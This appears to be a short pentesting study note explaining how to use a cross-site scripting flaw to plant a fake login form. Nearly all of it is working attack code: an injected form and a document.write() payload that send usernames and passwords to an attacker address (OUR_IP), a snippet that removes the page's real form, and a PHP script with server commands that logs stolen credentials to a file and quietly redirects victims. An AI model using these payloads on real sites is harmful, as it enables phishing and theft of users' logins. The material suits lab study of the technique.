---
title: b-Phishing
draft: false
tags:
  - Phishing
---
Common XSS attackisto send fake login forms that send the login details to the attacker's server.

## Login Form Injection

```html
<h3>Please login to continue</h3> <form action=http://OUR_IP> <input type="username" name="username" placeholder="Username"> <input type="password" name="password" placeholder="Password"> <input type="submit" name="submit" value="Login"> </form>
```

Minified payload with `document.write()`.

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Let's say there is a url form that website originally provides as such:

```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

We might want to remove such url form if it doesn't match with our phishing page. 

Let's get rid of it using `remove()` function:

```javascript
document.getElementById('urlform').remove();
```

Now, once we add this code to our previous JavaScript code (after the `document.write` function), we can use this new JavaScript code in our payload:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

## Credential Stealing

We can use `netcat` for this:

`sudo nc -lvnp 80`

But this won't handle the HTTP request correctly and the victim would get `Unable to connect` error.

We can use a PHP script to log credentials and return the victim with the original page. This case, victim may not notice anything unusual. 

The following code should work:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Let's save the code above as `index.php` and place it inside `/tmp/tmpserver`.

Now that we have `index.php` ready, let's start PHP listening server:

```shell-session
[!bash!]$ mkdir /tmp/tmpserver
[!bash!]$ cd /tmp/tmpserver
[!bash!]$ vi index.php #at this step we wrote our index.php file
[!bash!]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

